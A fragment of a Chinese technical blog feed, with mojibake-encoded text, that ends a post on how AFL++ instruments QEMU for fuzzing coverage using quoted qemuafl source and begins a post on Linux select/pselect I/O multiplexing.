æ”¹è¿›</h3><ul><li>å‚è€ƒèµ„æ–™[4]ä¸­é’ˆå¯¹AFLä¸­QEMUæ¨¡å¼å­˜åœ¨çš„é—®é¢˜è¿›è¡Œäº†é˜è¿°ï¼Œå¦‚ä¸‹ï¼š</li></ul><blockquote><p>åœ¨åŸå§‹çš„ <code>AFL qemu</code> ç‰ˆæœ¬ä¸­è·å–è¦†ç›–ç‡çš„æ–¹å¼æ˜¯åœ¨æ¯æ¬¡ç¿»è¯‘åŸºæœ¬å—å‰è°ƒç”¨ <code>afl_maybe_log</code> å¾€ <code>afl-fuzz</code> åŒæ­¥è¦†ç›–ç‡ä¿¡æ¯ï¼Œè¿™ç§æ–¹å¼æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ç”±äº <code>qemu</code> ä¼šæŠŠé¡ºåºæ‰§è¡Œçš„åŸºæœ¬å— <code>chain</code> ä¸€èµ·ï¼Œè¿™æ ·å¯ä»¥æå‡æ‰§è¡Œé€Ÿåº¦ã€‚ä½†æ˜¯åœ¨è¿™ç§æ–¹å¼ä¸‹æœ‰çš„åŸºæœ¬å—å°±ä¼šç”±äº <code>chain</code> çš„åŸå› å¯¼è‡´è¿½è¸ªä¸åˆ°åŸºæœ¬å—çš„æ‰§è¡Œï¼Œ <code>afl</code> çš„å¤„ç†æ–¹å¼æ˜¯ç¦ç”¨ <code>qemu</code> çš„ <code>chain</code> åŠŸèƒ½ï¼Œè¿™æ ·åˆ™ä¼šå‰Šå‡ <code>qemu</code> çš„æ€§èƒ½ï¼ˆ<span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åº”è¯¥ä¸å¤ªä¼šå½±å“<code>qemu</code>çš„æ€§èƒ½å§ï¼Œä½†ç¡®å®ä¼šé¢å¤–æ·»åŠ ä¸€äº›AFLæœ¬èº«çš„æ‰§è¡Œï¼‰ã€‚</p></blockquote><ul><li>æˆ‘ä»¬åœ¨ç¬¬ä¸€èŠ‚ä¸­é˜è¿°çš„QEMUç‰¹æ€§ä¸­ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå°±æ˜¯<code>Direct block chaining</code>ã€‚å…¶å®å°±æ˜¯è¯´ï¼ŒåŸæœ¬èƒ½å¤Ÿé¡ºåºåœ¨ä¸€èµ·çš„åŸºæœ¬å—ï¼Œæ¯”å¦‚A-&gt;B-&gt;Cï¼ŒQEMUå¯ä»¥å°†è¿™ä¸‰ä¸ªå—é“¾èµ·æ¥ï¼Œä»è€Œæ•´åˆä¸ºä¸€ä¸ªå—Aâ€™ã€‚ç„¶è€Œè¿™æ ·çš„æ“ä½œä¼šå¯¼è‡´AFLè·Ÿè¸ªåŸºæœ¬å—æ‰§è¡Œçš„ä¸ç²¾ç¡®ï¼Œå› æ­¤AFLç¦ç”¨äº†QEMUçš„chainåŠŸèƒ½</li><li>é‚£<a href="https://github.com/AFLplusplus/qemuafl/blob/master">AFL++çš„QEMUæ¨¡å¼</a>å¦‚ä½•è¿›è¡Œäº†æ”¹æœºå‘¢ï¼Ÿ</li></ul><ol><li>å°†ç»Ÿè®¡è¦†ç›–ç‡æ’æ¡©çš„ä»£ç æ’å…¥åˆ°æ¯ä¸ªç¿»è¯‘çš„åŸºæœ¬å—å‰é¢ï¼Œ<a href="https://github.com/AFLplusplus/qemuafl/blob/a1321713c7502c152dd7527555e0f8a800d55225/accel/tcg/translate-all.c#L2091C1-L2095C28">=&gt;ä»£ç </a>ï¼š</li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Generates TCG code for AFL's tracing instrumentation. */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">afl_gen_trace</span><span class="hljs-params">(target_ulong cur_loc)</span> {<br><br>  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><br><span class="hljs-comment">     Linux systems. */</span><br><br>  cur_block_is_good = afl_must_instrument(cur_loc);<br><br>  <span class="hljs-keyword">if</span> (!cur_block_is_good)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASLR is not a</span><br><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let's mangle</span><br><span class="hljs-comment">     the value to get something quasi-uniform. */</span><br><br>  <span class="hljs-comment">// cur_loc = (cur_loc &gt;&gt; 4) ^ (cur_loc &lt;&lt; 8);</span><br>  <span class="hljs-comment">// cur_loc &amp;= MAP_SIZE - 1;</span><br>  cur_loc = (<span class="hljs-type">uintptr_t</span>)(afl_hash_ip((<span class="hljs-type">uint64_t</span>)cur_loc));  <span class="hljs-comment">// &lt;==== è¿™é‡Œä½¿ç”¨äº†ä¸€ç§æ›´å¤æ‚çš„hashç®—æ³•</span><br>  cur_loc &amp;= (MAP_SIZE - <span class="hljs-number">1</span>);<br><br>  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><br><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span><br><br>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;<br><br>  TCGv cur_loc_v = tcg_const_tl(cur_loc);<br>  <span class="hljs-keyword">if</span> (unlikely(afl_track_unstable_log_fd() &gt;= <span class="hljs-number">0</span>)) {<br>    gen_helper_afl_maybe_log_trace(cur_loc_v);<br>  } <span class="hljs-keyword">else</span> {<br>    gen_helper_afl_maybe_log(cur_loc_v);<br>  }<br>  tcg_temp_free(cur_loc_v);<br><br>}<br><br><span class="hljs-comment">/* Called with mmap_lock held for user mode emulation.  */</span><br>TranslationBlock *<span class="hljs-title function_">tb_gen_code</span><span class="hljs-params">(CPUState *cpu,</span><br><span class="hljs-params">                              target_ulong pc, target_ulong cs_base,</span><br><span class="hljs-params">                              <span class="hljs-type">uint32_t</span> flags, <span class="hljs-type">int</span> cflags)</span><br>...<br>    tcg_ctx-&gt;cpu = env_cpu(env);<br>    afl_gen_trace(pc);  <span class="hljs-comment">// &lt;==== åœ¨æ¯ä¸ªåŸºæœ¬å—å‰æ’å…¥è¦†ç›–ç‡ç»Ÿè®¡çš„ä»£ç ï¼ˆè¿™ä¸ªideaå…¶å®å’Œclang-fastæ’æ¡©æ–¹å¼æ˜¯ä¸€è‡´çš„ï¼‰</span><br>    gen_intermediate_code(cpu, tb, max_insns);<br>    tcg_ctx-&gt;cpu = <span class="hljs-literal">NULL</span>;<br>    max_insns = tb-&gt;icount;<br>...<br></code></pre></td></tr></tbody></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<code>gen_helper_afl_maybe_log</code>å’Œ<code>gen_helper_afl_maybe_log_trace</code>è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ç”¨äº<a href="https://github.com/AFLplusplus/qemuafl/blob/a1321713c7502c152dd7527555e0f8a800d55225/target/hexagon/README#L49">åˆ›å»ºä¸€ä¸ªTCGçš„callè°ƒç”¨</a>ï¼Œå¹¶è°ƒç”¨<code>afl_maybe_log</code>æˆ–<code>afl_maybe_log_trace</code>è¿™ä¸¤ä¸ªå‡½æ•°ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯ç”¨äºç”Ÿæˆè°ƒç”¨AFLè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡çš„ç›¸å…³å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å®šä¹‰åœ¨accel/tcg/translate-all.cä¸­ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">HELPER</span><span class="hljs-params">(afl_maybe_log)</span><span class="hljs-params">(target_ulong cur_loc)</span> {<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uintptr_t</span> afl_idx = cur_loc ^ afl_prev_loc;<br><br>  INC_AFL_AREA(afl_idx);<br><br>  <span class="hljs-comment">// afl_prev_loc = ((cur_loc &amp; (MAP_SIZE - 1) &gt;&gt; 1)) |</span><br>  <span class="hljs-comment">//                ((cur_loc &amp; 1) &lt;&lt; ((int)ceil(log2(MAP_SIZE)) -1));</span><br>  afl_prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">HELPER</span><span class="hljs-params">(afl_maybe_log_trace)</span><span class="hljs-params">(target_ulong cur_loc)</span> {<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uintptr_t</span> afl_idx = cur_loc;<br>  INC_AFL_AREA(afl_idx);<br>}<br></code></pre></td></tr></tbody></table></figure><p>include/exec/helper-head.hï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> HELPER(name) glue(helper_, name)</span><br></code></pre></td></tr></tbody></table></figure><p>include/exec/helper-gen.h:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_HELPER_FLAGS_1(name, flags, ret, t1)                        \</span><br><span class="hljs-meta">static inline void glue(gen_helper_, name)(dh_retvar_decl(ret)          \</span><br><span class="hljs-meta">    dh_arg_decl(t1, 1))                                                 \</span><br><span class="hljs-meta">{                                                                       \</span><br><span class="hljs-meta">  TCGTemp *args[1] = { dh_arg(t1, 1) };                                 \</span><br><span class="hljs-meta">  tcg_gen_callN(HELPER(name), dh_retvar(ret), 1, args);                 \</span><br><span class="hljs-meta">}</span><br></code></pre></td></tr></tbody></table></figure><p><code>afl_gen_trace()</code>ç”¨äºåœ¨æ¯ä¸ªåŸºæœ¬å—å‰æ’å…¥<code>afl_maybe_log</code>æˆ–<code>afl_maybe_log_trace</code>çš„å‡½æ•°è°ƒç”¨ï¼Œè·Ÿè¸ªç¨‹åºçš„è¦†ç›–æƒ…å†µã€‚</p><ol start="2"><li><a href="https://github.com/AFLplusplus/qemuafl/blob/a1321713c7502c152dd7527555e0f8a800d55225/accel/tcg/cpu-exec.c#L1380C1-L1380C1">ä¸forkserverçš„åŒæ­¥</a>ï¼š</li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> TranslationBlock *<span class="hljs-title function_">tb_find</span><span class="hljs-params">(CPUState *cpu,</span><br><span class="hljs-params">                                        TranslationBlock *last_tb,</span><br><span class="hljs-params">                                        <span class="hljs-type">int</span> tb_exit, <span class="hljs-type">uint32_t</span> cf_mask)</span><br>{<br>    ...<br>    <span class="hljs-keyword">if</span> (tb == <span class="hljs-literal">NULL</span>) {<br>        mmap_lock();<br>        tb = tb_gen_code(cpu, pc, cs_base, flags, cf_mask);<br>        was_translated = <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ–°ç¿»è¯‘çš„åŸºæœ¬å—</span><br>        mmap_unlock();<br>        <span class="hljs-comment">/* We add the TB in the virtual pc hash table for the fast lookup */</span><br>        qatomic_set(&amp;cpu-&gt;tb_jmp_cache[tb_jmp_cache_hash_func(pc)], tb);<br>    }<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_USER_ONLY</span><br>    <span class="hljs-comment">/* We don't take care of direct jumps when address mapping changes in</span><br><span class="hljs-comment">     * system emulation. So it's not safe to make a direct jump to a TB</span><br><span class="hljs-comment">     * spanning two pages because the mapping for the second page can change.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (tb-&gt;page_addr[<span class="hljs-number">1</span>] != <span class="hljs-number">-1</span>) {<br>        last_tb = <span class="hljs-literal">NULL</span>;<br>    }<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* See if we can patch the calling TB. */</span><br>    <span class="hljs-keyword">if</span> (last_tb) {<br>        tb_add_jump(last_tb, tb_exit, tb);<br>        was_chained = <span class="hljs-literal">true</span>;<br>    }<br>    <span class="hljs-keyword">if</span> (was_translated || was_chained) {<br>        afl_request_tsl(pc, cs_base, flags, cf_mask,<br>                        was_chained ? last_tb : <span class="hljs-literal">NULL</span>, tb_exit);  <span class="hljs-comment">// &lt;=== å¦‚æœæœ‰æ–°ç¿»è¯‘çš„åŸºæœ¬å—æˆ–è€…æ–°æ„å»ºçš„chainï¼Œåˆ™é€šçŸ¥forkserveræ›´æ–°ç¼“å­˜</span><br>    }<br>    <span class="hljs-keyword">return</span> tb;<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä¸<code>afl_request_tsl()</code>ç›¸åŒ¹é…çš„æ˜¯<code>afl_wait_tsl()</code>ï¼Œè¯¥å‡½æ•°æ£€æŸ¥å½“å‰ç¼“å­˜çš„TBï¼Œå¦‚æœæ˜¯æ–°TBï¼Œåˆ™åˆ¤æ–­è¯¥TBçš„PCæ˜¯å¦åˆæ³•ã€‚è¿™é‡Œæºç æ³¨é‡Šä¸­æè¿°åˆ°ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!tb) {<br><br>  <span class="hljs-comment">/* The child may request to transate a block of memory that is not</span><br><span class="hljs-comment">     mapped in the parent (e.g. jitted code or dlopened code).</span><br><span class="hljs-comment">     This causes a SIGSEV in gen_intermediate_code() and associated</span><br><span class="hljs-comment">     subroutines. We simply avoid caching of such blocks. */</span><br><br>  <span class="hljs-keyword">if</span> (is_valid_addr(t.tb.pc)) {<br><br>    mmap_lock();<br>    tb = tb_gen_code(cpu, t.tb.pc, t.tb.cs_base, t.tb.flags, t.tb.cf_mask);<br>    mmap_unlock();<br><br>  } <span class="hljs-keyword">else</span> {<br><br>    invalid_pc = <span class="hljs-number">1</span>;<br><br>  }<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå­è¿›ç¨‹è¯·æ±‚ç¿»è¯‘ä¸€ä¸ªæ²¡æœ‰åœ¨çˆ¶è¿›ç¨‹ä¸­æ˜ å°„çš„å†…å­˜å—æ—¶ï¼Œè¿™ä¼šå¯¼è‡´åœ¨<code>gen_intermediate_code()</code>å‡½æ•°ä»¥åŠåç»­ç›¸å…³è”çš„ç¨‹åºä¸­å‘ç”ŸSEGVçš„é”™è¯¯å› æ­¤åº”å½“é¿å…ç¼“å­˜è¿™ç±»å—ï¼Œå› æ­¤è¿™é‡Œåšäº†ä¸€ä¸ªè¿‡æ»¤æ“ä½œã€‚</p><p>æ­¤å¤–ï¼Œè¯¥ç‰ˆæœ¬çš„æ”¹è¿›è¿˜é¢å¤–æ”¯æŒäº†AFLä¸­çš„<code>persistent</code>æ¨¡å¼ï¼Œæ­¤èŠ‚ä¸å†è¯¦ç»†ä»‹ç»ï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥é˜…è¯»[qemuaflçš„æºç ](<a href="https://github.com/AFLplusplus/qemuafl/">AFLplusplus/qemuafl: This fork of QEMU enables fuzzing userspace ELF binaries under AFL++. (github.com)</a>)</p><h2 id="3-å°ç»“"><a href="#3-å°ç»“" class="headerlink" title="3. å°ç»“"></a>3. å°ç»“</h2><ul><li>QEMUæœ¬è´¨ä¸Šå°±æ˜¯ç”¨è½¯ä»¶å»æ¨¡æ‹Ÿä¸åŒå¹³å°ä¸‹çš„ç¨‹åºè¿è¡Œçš„ä¸€ä¸ªè™šæ‹Ÿæœº</li><li>AFL/AFL++å¯¹QEMUæºç è¿›è¡Œäº†é€‚å½“çš„é­”æ”¹ï¼Œä½¿å…¶èƒ½å¤Ÿä¸æ¨¡ç³Šå™¨è¿›è¡Œé€šä¿¡å¹¶å®Œæˆç›¸å…³è¦†ç›–ç‡çš„ç»Ÿè®¡æˆ–å…¶ä»–åŠŸèƒ½</li><li>ä¸å»ºè®®ä½¿ç”¨AFLæä¾›çš„ä¸€é”®å®‰è£…QEMUçš„è„šæœ¬ï¼Œå»ºè®®ä½¿ç”¨AFL++ä¸­é­”æ”¹è¿‡åçš„QEMUç‰ˆæœ¬ï¼š<a href="https://github.com/AFLplusplus/qemuafl/">AFLplusplus/qemuafl: This fork of QEMU enables fuzzing userspace ELF binaries under AFL++. (github.com)</a></li></ul><h2 id="link-Reference"><a href="#link-Reference" class="headerlink" title=":link: Reference:"></a><span class="github-emoji"><span>ğŸ”—</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f517.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Reference:</h2><ol><li><a href="https://github.com/lishuhuakai/qemu_reading/tree/main/Document/qemu-0.1.6">https://github.com/lishuhuakai/qemu_reading/tree/main/Document/qemu-0.1.6</a></li><li>[Translator Internals â€” QEMU documentation](<a href="https://www.qemu.org/docs/master/devel/tcg.html#:~:text=QEMU">https://www.qemu.org/docs/master/devel/tcg.html#:~:text=QEMU</a> is a dynamic translator,simple while achieving good performances.)</li><li>Bellard, Fabrice. â€œQEMU, a fast and portable dynamic translator.â€ <em>USENIX annual technical conference, FREENIX Track</em>. Vol. 41. 2005.</li><li><a href="https://xz.aliyun.com/t/6457">åŸºäºqemuå’Œunicornçš„FuzzæŠ€æœ¯åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></li><li><a href="https://www.cnblogs.com/revercc/p/16294051.html">Linuxä¸­ELFæ–‡ä»¶å¯åŠ¨è¿‡ç¨‹ - æ€ä¹ˆå¯ä»¥åƒçªçª - åšå®¢å›­ (cnblogs.com)</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      
      <tag>AFL</tag>
      
      <tag>QEMU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºLinux IOå¤šè·¯å¤ç”¨é‚£äº›äº‹</title>
    <link href="/2023/07/10/%E5%85%B3%E4%BA%8ELinux%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2023/07/10/%E5%85%B3%E4%BA%8ELinux%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºI-x2F-Oå¤šè·¯å¤ç”¨é‚£äº›äº‹"><a href="#å…³äºI-x2F-Oå¤šè·¯å¤ç”¨é‚£äº›äº‹" class="headerlink" title="å…³äºI/Oå¤šè·¯å¤ç”¨é‚£äº›äº‹"></a>å…³äºI/Oå¤šè·¯å¤ç”¨é‚£äº›äº‹</h1><p><strong>Q1ï¼šä¸ºä»€ä¹ˆéœ€è¦I/Oå¤šè·¯å¤ç”¨ï¼Ÿ</strong>[1]</p><p><strong>A1ï¼š</strong></p><ul><li><p>TCP Socketåªèƒ½å®ç°ä¸€å¯¹ä¸€é€šä¿¡ ==&gt; åŒæ­¥<strong>é˜»å¡</strong>ï¼ˆè¿æ¥è¯·æ±‚é¥¥é¥¿æ€§ï¼‰ï¼šreadé˜»å¡ç›´åˆ°è¯·æ±‚æ•°æ®ä¼ é€è¿‡æ¥å¹¶write</p><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å¦‚æœæ²¡æœ‰I/Oå¤šè·¯å¤ç”¨ï¼Œé‚£å¦‚ä½•æ›´å¥½æœåŠ¡æ›´å¤šçš„ç”¨æˆ·ï¼Ÿ</p><ul><li>ä¸€ä¸ªè¯·æ±‚å¯¹åº”ä¸€ä¸ªçº¿ç¨‹ ==&gt; ç»´æŠ¤ä¸€ä¸ªçº¿ç¨‹æ± </li><li>çº¿ç¨‹æ± çš„ç¼ºç‚¹ï¼š1ï¼‰å¦‚ä½•ç¡®å®šé¢„å…ˆåˆ†é…çš„çº¿ç¨‹æ± ä¸­çº¿ç¨‹çš„æ•°é‡ï¼Ÿå¦‚æœåˆ†é…å°‘äº†ï¼Œä½†è¿æ¥æ•°æ¿€å¢ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç¨‹åºç›´æ¥å´©æºƒæˆ–è€…ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€å¤ªå¤§å¯¼è‡´ç¨‹åº<strong>è¿è¡Œæ•ˆç‡å¾ˆä½</strong>ï¼›å¦‚æœåˆ†é…è¿‡å¤šï¼Œä½†è¿æ¥æ•°å¾ˆå°‘ï¼Œä¼šå¯¼è‡´å·²åˆ†é…çš„çº¿ç¨‹å¾—ä¸åˆ°åˆ©ç”¨è€Œé€ æˆ<strong>èµ„æºæµªè´¹</strong></li></ul></li><li><p>I/Oï¼ˆæ—¶åˆ†ï¼‰å¤šè·¯å¤ç”¨ï¼šä¸€ä¸ªçº¿ç¨‹ç»´æŠ¤å¤šä¸ªSocket</p></li></ul><hr><p><strong>Q2ï¼šå¦‚ä½•è¿›è¡ŒI/Oå¤šè·¯å¤ç”¨ï¼Ÿ</strong></p><p><strong>A2ï¼š</strong></p><ul><li><p>ä½¿ç”¨ä¸€ä¸ªæ“ä½œç³»ç»Ÿæœºåˆ¶æ¥è½®è¯¢ä¸€ç»„æ–‡ä»¶æè¿°ç¬¦ï¼Œåœ¨Linuxä¸­ï¼Œä¸»è¦æœ‰ä¸‰ç§æ“ä½œï¼š<strong>select</strong>ã€<strong>poll</strong>å’Œ<strong>epoll</strong></p></li><li><p>Linuxï¼ˆUnixï¼‰æ“ä½œç³»ç»Ÿå†…æ ¸æä¾›ç»™ç”¨æˆ·æ€çš„å¤šè·¯å¤ç”¨<strong>ç³»ç»Ÿè°ƒç”¨</strong>ï¼ˆselectã€pollã€epollï¼‰ï¼Œè¿›ç¨‹å¯ä»¥é€šè¿‡ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°ä»å†…æ ¸ä¸­è·å–å¤šä¸ªäº‹ä»¶</p></li></ul><hr><h2 id="E1ï¼šSelectç³»ç»Ÿè°ƒç”¨"><a href="#E1ï¼šSelectç³»ç»Ÿè°ƒç”¨" class="headerlink" title="E1ï¼šSelectç³»ç»Ÿè°ƒç”¨"></a><strong>E1ï¼šSelectç³»ç»Ÿè°ƒç”¨</strong></h2><ul><li><p>å‡½æ•°ç­¾å[3-4]ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">select</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-type">int</span> nfds, <span class="hljs-comment">// æ‰€å…è®¸è®¾ç½®çš„æœ€å¤§æ–‡ä»¶æè¿°ç¬¦å€¼+1</span></span><br><span class="hljs-params">    fd_set *readfds,<span class="hljs-comment">// è¯»æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼ˆselectè¿”å›åï¼Œreadfdsä»…ä¿ç•™é‚£äº›å‡†å¤‡è¯»å–çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰</span></span><br><span class="hljs-params">    fd_set *writefds,<span class="hljs-comment">// å†™æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼ˆselectè¿”å›åï¼Œreadfdsä»…ä¿ç•™é‚£äº›å‡†å¤‡å†™çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰</span></span><br><span class="hljs-params">    fd_set *exceptfds,<span class="hljs-comment">// ç›‘æ§å¼‚å¸¸æ¡ä»¶ï¼ˆexceptional conditionsï¼‰</span></span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> timeval *timeout<span class="hljs-comment">// timevalç»“æ„ä½“ï¼Œç”¨æ¥æè¿°è¶…æ—¶ä¿¡æ¯ï¼ˆå…¨0è¡¨ç¤ºç«‹åˆ»è¿”å›ï¼Œä¸ºNULLè¡¨ç¤ºæ— é™ç­‰å¾…ï¼‰</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></tbody></table></figure></li><li><p><span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> select()è°ƒç”¨æ¥è§¦é˜»å¡çš„æ¡ä»¶ï¼š</p><ul><li>ä»»æ„ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å‡†å¤‡å¥½äº†</li><li>è°ƒç”¨è¢«ä¸€ä¸ªä¿¡å·å¤„ç†å™¨æ‰€ä¸­æ–­</li><li>è¶…æ—¶ [ç”±å‚æ•°timeoutæ§åˆ¶]</li></ul></li><li><p>ä¸fd_setæ“ä½œæœ‰å…³çš„å®ï¼š</p><ul><li>**FD_ZERO()**ï¼šæ¸…ç©ºset</li><li>**FD_SET()**ï¼šå°†fdæ·»åŠ åˆ°setä¸­</li><li>**FD_CLR()**ï¼šå°†fdä»setä¸­ç§»é™¤</li><li>**FD_ISSET()**ï¼šå¯ä»¥åœ¨è°ƒç”¨select()ä¹‹åï¼Œæ£€æŸ¥æŸä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ˜¯å¦ä»ç„¶åœ¨ä¸€ä¸ªé›†åˆä¸­ï¼Œè¿”å›é0è¡¨ç¤ºè¯¥æ–‡ä»¶æè¿°ç¬¦åœ¨é›†åˆä¸­ï¼Œå¦åˆ™è¿”å›0</li></ul></li><li><p><strong>pselect()</strong></p><ul><li><p>å‡½æ•°ç­¾åï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pselect</span><span class="hljs-params">(<span class="hljs-type">int</span> nfds, fd_set *_Nullable <span class="hljs-keyword">restrict</span> readfds,</span><br><span class="hljs-params">                  fd_set *_Nullable <span class="hljs-keyword">restrict</span> writefds,</span><br><span class="hljs-params">                  fd_set *_Nullable <span class="hljs-keyword">restrict</span> exceptfds,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *_Nullable <span class="hljs-keyword">restrict</span> timeout,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *_Nullable <span class="hljs-keyword">restrict</span> sigmask)</span>;<br></code></pre></td></tr></tbody></table></figure></li><li><p>æä¾›é¢å¤–ä¸€ä¸ªä¿¡å·æ©ç 